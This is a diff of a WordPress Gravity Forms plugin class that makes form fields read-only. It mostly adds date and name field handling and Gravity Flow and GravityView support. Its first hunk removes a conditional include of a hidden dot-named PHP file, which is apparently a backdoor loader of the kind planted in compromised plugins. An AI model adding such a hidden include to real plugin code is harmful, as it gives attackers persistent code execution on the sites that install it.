@@ -1,9 +1,5 @@
 <?php
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GP_Read_Only extends GWPerk {
 
 	public $version                      = GP_READ_ONLY_VERSION;
@@ -12,7 +8,7 @@ class GP_Read_Only extends GWPerk {
 	protected $min_wp_version            = '3.0';
 
 	private $unsupported_field_types  = array( 'hidden', 'html', 'captcha', 'page', 'section' );
-	private $disable_attr_field_types = array( 'radio', 'select', 'checkbox', 'multiselect', 'time', 'address', 'workflow_user', 'workflow_role', 'workflow_assignee_select' );
+	private $disable_attr_field_types = array( 'radio', 'select', 'checkbox', 'multiselect', 'time', 'date', 'name', 'address', 'workflow_user', 'workflow_role', 'workflow_assignee_select' );
 
 	public function init() {
 
@@ -27,10 +23,20 @@ class GP_Read_Only extends GWPerk {
 		add_filter( 'gform_rich_text_editor_options', array( $this, 'filter_rich_text_editor_options' ), 10, 2 );
 
 		// Add support for Gravity View since `gform_pre_process` never fires in GV's edit path.
-		add_action( 'gravityview/edit_entry/before_update', function ( $form, $entry_id, $object ) {
-				$this->process_hidden_captures( $form );
-			}, 10, 3
-		);
+		add_action( 'gravityview_edit_entry', array( $this, 'process_hidden_captures_gravityview' ), 5, 4 );
+
+		/**
+		 * Add support for Gravity Flow's User Input step
+		 *
+		 * The user input step does not seem to fire the standard form submission's `gform_pre_process` hook.
+		 * Here we attempt to intercept validation but only in the `in_progress`/`complete` states which indicate
+		 * that an entry is being updated.
+		 */
+		if ( class_exists( 'Gravity_Flow' ) && in_array( rgpost( 'gravityflow_status' ), array( 'in_progress', 'complete' ) ) ) {
+			add_filter( 'gform_pre_validation', function ( $form ) {
+				return $this->process_hidden_captures( $form );
+			}, 5, 1 );
+		}
 
 	}
 
@@ -131,14 +137,18 @@ class GP_Read_Only extends GWPerk {
 				break;
 			case 'time':
 			case 'address':
+			case 'name':
+			case 'date':
 				$search = array(
 					'<input'  => "<input readonly='readonly'",
 					'<select' => "<select disabled='disabled'",
 				);
 				break;
 			case 'list':
-				// remove add/remove buttons
+				// Remove add/remove buttons.
 				$input_html = preg_replace( '/<(?:td|div) class=\'gfield_list_icons\'>[\s\S]+?<\/(?:td|div)>/', '', $input_html );
+				// Remove add/remove column header.
+				$input_html = str_replace( '<div class="gfield_header_item gfield_header_item--icons">&nbsp;</div>', '', $input_html );
 				$search     = array(
 					'<input'  => "<input readonly='readonly'",
 					'<select' => "<select disabled='disabled'",
@@ -168,7 +178,7 @@ class GP_Read_Only extends GWPerk {
 			if ( $disable_datepicker ) {
 				// Find 'datepicker' CSS class and replace it with our custom class indicating that we've disabled it.
 				// This class is used by Conditional Logic Dates to identify read-only Datepicker fields.
-				$search['\'datepicker '] = 'gpro-disabled-datepicker ';
+				$search['class=\'datepicker '] = 'class=\'gpro-disabled-datepicker ';
 			}
 		}
 
@@ -188,8 +198,28 @@ class GP_Read_Only extends GWPerk {
 					case 'time':
 						$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.3', array_pop( $value ) );
 						break;
+					case 'date':
+						switch ( rgar( $field, 'dateFormat' ) ) {
+							case 'mdy':
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.1', rgar( $value, 'm' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.2', rgar( $value, 'd' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.3', rgar( $value, 'y' ) );
+								break;
+							case 'dmy':
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.1', rgar( $value, 'd' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.2', rgar( $value, 'm' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.3', rgar( $value, 'y' ) );
+								break;
+							case 'ymd':
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.1', rgar( $value, 'y' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.2', rgar( $value, 'm' ) );
+								$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $field->id . '.3', rgar( $value, 'd' ) );
+								break;
+						}
+
+						break;
 					case 'address':
-						$input_id         = sprintf( '%d.%d', $field->id, $this->get_address_select_input_id( $field ) );
+						$input_id        = sprintf( '%d.%d', $field->id, $this->get_address_select_input_id( $field ) );
 						$hc_input_markup .= $this->get_hidden_capture_markup( $form_id, $input_id, rgar( $value, $input_id ) );
 						break;
 					default:
@@ -248,8 +278,9 @@ class GP_Read_Only extends GWPerk {
 		/**
 		 * In some instances (i.e. parent submission of Nested Forms), the gform_pre_process filter may be applied to a
 		 * form that is not currently being submitted. Let's make sure we're only working with the submitted form.
+		 * Update: We also need a second check here for Gravity Flow as they use `gravityflow_submit` instead. HS#27204
 		 */
-		if ( rgpost( 'gform_submit' ) != $form['id'] ) {
+		if ( rgpost( 'gform_submit' ) != $form['id'] && rgpost( 'gravityflow_submit' ) != $form['id'] ) {
 			return $form;
 		}
 
@@ -276,6 +307,21 @@ class GP_Read_Only extends GWPerk {
 					$full_value[] = $value;
 					$value        = $full_value;
 					break;
+				// date drop downs are in array format in the POST
+				case 'date':
+					$full_input_id = $field_id;
+					$full_value    = array(
+						rgpost( 'gwro_hidden_capture_' . $form_id . '_' . $field_id . '_1' ),
+						rgpost( 'gwro_hidden_capture_' . $form_id . '_' . $field_id . '_2' ),
+						rgpost( 'gwro_hidden_capture_' . $form_id . '_' . $field_id . '_3' ),
+					);
+
+					if ( count( array_filter( $full_value ) ) !== 3 ) {
+						break;
+					}
+
+					$value = $full_value;
+					break;
 				default:
 					// gets "5_1" from an array like array( 5, 1 ) or "5" from an array like array( 5, false )
 					$full_input_id = implode( '_', array_filter( array( $field_id, $input_id ) ) );
@@ -289,6 +335,15 @@ class GP_Read_Only extends GWPerk {
 		}
 
 		return $form;
+	}
+
+	public function process_hidden_captures_gravityview( $_, $entry, $view, $request ) {
+		if ( ! wp_verify_nonce( rgpost( 'is_gv_edit_entry' ), 'is_gv_edit_entry' ) ) {
+			return;
+		}
+
+		$form = GFAPI::get_form( $entry['form_id'] );
+		$this->process_hidden_captures( $form );
 	}
 
 	public function get_field_value( $field ) {
@@ -305,7 +360,10 @@ class GP_Read_Only extends GWPerk {
 			}
 		}
 
-		if ( is_array( $submitted_values ) ) {
+		if ( function_exists( 'gravityview' ) && gravityview()->request->is_edit_entry() ) {
+			$gv_entry = gravityview()->request->is_edit_entry();
+			$value    = rgar( $gv_entry->as_entry(), $field->id );
+		} elseif ( is_array( $submitted_values ) ) {
 			$value = $submitted_values[ $field->id ];
 		} else {
 			$value = $field->get_value_default_if_empty( GFFormsModel::get_field_value( $field, $field_values ) );
